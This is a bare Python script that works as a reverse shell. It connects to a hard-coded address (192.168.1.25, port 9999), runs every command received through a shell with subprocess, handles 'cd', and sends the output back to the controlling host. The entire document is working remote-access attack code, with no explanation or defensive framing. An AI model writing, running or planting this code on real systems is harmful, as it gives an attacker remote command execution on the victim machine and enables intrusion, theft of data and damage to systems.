import os
import subprocess as sp
import socket
s = socket.socket()
host = "192.168.1.25"
port = 9999
s.connect((host, port))
while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == "cd":
        os.chdir(data[3:].decode("utf-8"))
    if len(data) > 0:
        cmd = sp.Popen(data[:].decode("utf-8"), shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes, "utf-8")
        s.send(str.encode(output_str + str(os.getcwd()) + "> "))
        print(output_str)
s.close()
